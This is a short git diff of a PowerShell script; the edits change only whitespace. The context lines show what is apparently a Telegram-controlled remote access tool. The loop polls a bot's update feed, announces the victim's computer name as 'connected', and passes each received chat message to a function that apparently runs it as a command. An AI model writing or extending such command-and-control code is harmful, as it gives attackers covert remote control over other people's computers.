@@ -46,12 +46,11 @@ while($true) { $json = Invoke-WebRequest -Uri $getUpdatesLink -Body @{offset=$of
 	$i = 0
 if ($first_connect -eq 1) {$texto = "$env:COMPUTERNAME connected :D"; envia-mensaje -text $texto -chat $chat_id -botkey $botkey; $first_connect = $first_connect + 1}
 	while ($i -lt $l) {
-		$offset = $json.result[$i].update_id + 1
+	$offset = $json.result[$i].update_id + 1
         $comando = $json.result[$i].message.text
         test-command -comando $comando -botkey $botkey -chat_id $chat_id -first_connect $first_connect
-   		$i++
+   	$i++
 	}
-
 	Start-Sleep -s $delay ;$first_connect++ 
 }
 }
